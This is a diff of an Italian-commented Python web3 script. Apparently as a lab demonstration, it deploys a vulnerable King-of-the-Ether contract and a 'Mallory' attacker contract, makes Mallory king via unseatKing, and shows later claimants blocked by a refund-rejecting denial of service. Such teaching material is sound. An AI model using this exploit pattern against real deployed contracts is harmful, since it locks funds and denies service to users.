@@ -125,67 +125,60 @@ malloryBytecode = "6060604052341561000f57600080fd5b6101358061001e6000396000f3006
 accounts = web3.eth.accounts
 # Set dell'account con il quale farò i deploy
 web3.eth.defaultAccount = web3.eth.accounts[0]
-print("Account di default:\n" + accounts[0] + "\n")
 
 # Definisco un oggetto contratto kotet2 a partire dall'interfaccia e dal bytecode
 kotet2Contract = web3.eth.contract(abi=kotet2InterfaceJS, bytecode=kotet2Bytecode)
-
-# Definisco un oggetto contratto mallory a partire dall'interfaccia e dal bytecode
-malloryContract = web3.eth.contract(abi=malloryInterfaceJS, bytecode=malloryBytecode)
-
 # Costruisco la transazione per fare il deploy del contratto kotet2
-contract_data = kotet2Contract.constructor().buildTransaction({'value': 1000000000000000000})
+contract_data = kotet2Contract.constructor().buildTransaction({'from': accounts[0], 'value': 1000000000000000000})
 # Spedisco la transazione 
 deploy_txn = web3.eth.sendTransaction(contract_data)
 #Attendo che la mia transazione venga elaborata e prendo la ricevuta
 txn_receipt = web3.eth.waitForTransactionReceipt(deploy_txn)
 # Salvo in un oggetto il contratto deployato
 contract_kotet2 = web3.eth.contract(address=txn_receipt.contractAddress, abi=kotet2InterfaceJS)
+# Address, balance e functions di KotET2
+print("L'account[0] ha pubblicato il contratto KotET2: " + str((contract_kotet2.address)) 
++ "\nil cui bilancio iniziale è: " + str(web3.eth.getBalance(contract_kotet2.address)) + "\ned offre le seguenti funzioni:" + "\n"
++ str(contract_kotet2.all_functions()) + "\n")
 
+# Definisco un oggetto contratto mallory a partire dall'interfaccia e dal bytecode
+malloryContract = web3.eth.contract(abi=malloryInterfaceJS, bytecode=malloryBytecode)
 # Costruisco la transazione per fare il deploy del contratto mallory
-contract_data = malloryContract.constructor().buildTransaction()
+contract_data = malloryContract.constructor().buildTransaction({'from': accounts[1]})
 # Spedisco la transazione 
 deploy_txn = web3.eth.sendTransaction(contract_data)
 #Attendo che la mia transazione venga elaborata e prendo la ricevuta
 txn_receipt = web3.eth.waitForTransactionReceipt(deploy_txn)
 # Salvo in un oggetto il contratto deployato
 contract_mallory = web3.eth.contract(address=txn_receipt.contractAddress, abi=malloryInterfaceJS)
-
-# Bilancio del contratto kotet2
-print("Bilancio del contratto kotet2:\n" + str(web3.eth.getBalance(contract_kotet2.address)) + "\n")
-
-# Funzioni del contratto kotet2
-print("Funzioni offerte dal contratto kotet2:\n" + str(contract_kotet2.all_functions()) + "\n")
+# Address, balance e functions di Mallory
+print("L'account[1] ha pubblicato il contratto Mallory: " + str((contract_mallory.address)) 
++ "\nil cui bilancio iniziale è: " + str(web3.eth.getBalance(contract_mallory.address)) + "\ned offre le seguenti funzioni:" + "\n"
++ str(contract_mallory.all_functions()) + "\n")
 
 # Stampa del re
-print("Re del contratto kotet2 (perché ne ha fatto il deploy):\n" + str(contract_kotet2.functions.king().call()) + "\n")
-
-# Stampa del re
-print("Re del contratto kotet2 (perché ne ha fatto il deploy):\n" + str(contract_kotet2.functions.king().call()) + "\n")
+print("Re del contratto kotet2 (è account[0] perché ne ha fatto il deploy):\n" + str(contract_kotet2.functions.king().call()) + "\n")
 
 # Stampa del prezzo da pagare per diventare re
 x = contract_kotet2.functions.claimPrice().call()
 print("Il prezzo da pagare per diventare re ammonta a:\n" + str(x) + "\n")
 
-# Funzioni del contratto mallory
-print("Funzioni offerte dal contratto mallory:\n" + str(contract_mallory.all_functions()) + "\n")
-
-# Alice richiama la funzione unseatKing con 100 wei per far diventare il contratto maligno il nuovo re
-contract_mallory.functions.unseatKing(contract_kotet2.address, x).transact({'value': x})
-
-# Contratto maligno
-print("Indirizzo del contratto maligno:\n" + str(contract_mallory.address) + "\n")
+# account[1] richiama la funzione unseatKing di Mallory con 100 wei per far diventare il contratto maligno il nuovo re
+contract_mallory.functions.unseatKing(contract_kotet2.address, x).transact({'value': x, 'from': accounts[1]})
+print(".........account[1] invoca unseatKing di Mallory per far diventare il contratto re.........\n")
 
 # Stampa del nuovo re
-print("Re del contratto kotet2 (è il contratto maligno che fa DoS):\n" + str(contract_kotet2.functions.king().call()) + "\n")
+print("Il nuovo re del contratto kotet2 è il contratto Mallory (è il contratto maligno che fa DoS):\n" + 
+str(contract_kotet2.functions.king().call()) + "\n")
+
 
 # Stampa del prezzo da pagare per diventare re aggiornato
 x = contract_kotet2.functions.claimPrice().call()
 print("Il nuovo prezzo da pagare per diventare re ammonta a:\n" + str(x) + "\n")
 
 # Adesso come si vede se qualcuno prova a diventare il nuovo re non ci riesce
-# Cindy invoca la fallback per diventare re l'attacco
+# account[2] invoca la fallback per diventare re
 try: 
-	contract_kotet2.fallback.transact({'value': x})
+	contract_kotet2.fallback.transact({'value': x, 'from': accounts[2]})
 except:
-	print("Contratto rotto")
+	print("Non puoi diventare re!!! Non riesco a mandare il compenso a Mallory\n")
